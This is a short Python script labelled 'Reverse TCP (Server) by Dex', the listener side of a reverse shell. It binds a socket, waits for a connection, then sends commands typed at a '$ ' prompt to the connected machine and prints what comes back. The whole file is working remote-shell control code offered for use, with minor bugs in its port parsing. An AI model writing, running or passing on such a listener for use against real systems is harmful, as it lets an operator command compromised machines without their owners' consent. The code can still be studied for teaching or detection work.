import socket,getopt,os,sys

if os.geteuid() != 0:
	exit("[!] Root privileges are required to run this script.")

def usage():

	print("\nReverse TCP (Server) by Dex")
	print()
	print("Usage: server.py -p <port>")
	print("Example: server.py -p 8000")
	print("Example: server.py -p 1337")
	sys.exit(0)

def main():

	host = '127.0.0.1'
	port = 0

	if not len(sys.argv[1:]):
		usage()

	try:
		opts, args = getopt.getopt(sys.argv[1:], "hp:",["help","port="])
	except getopt.GetoptError as err:
		print(str(err))
		usage()

	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in("-p","--port"):
			try:
				port = int(sys.argv[2])
			except:
				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
		else:
			assert False,"Unhandled Option"

	listener(host,port)

def listener(host,port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.bind((host,port))
	s.listen(1)
	conn, addr= s.accept()

	print("conn established.")

	while 1:
		command = input("$ ")

		if command != "exit":
			if command == "":
				continue

			command = command.encode('utf-8')

			conn.send(command)
			result = conn.recv(1024)
			result = result.decode('utf-8')
			print(result)
		else:
			exit = 'exit'
			exitcommand = exit.encode('utf-8')

			conn.send(exitcommand)
			print("[+] Shell Going Down.")
			break
	s.close()

if __name__ == "__main__":
	main()
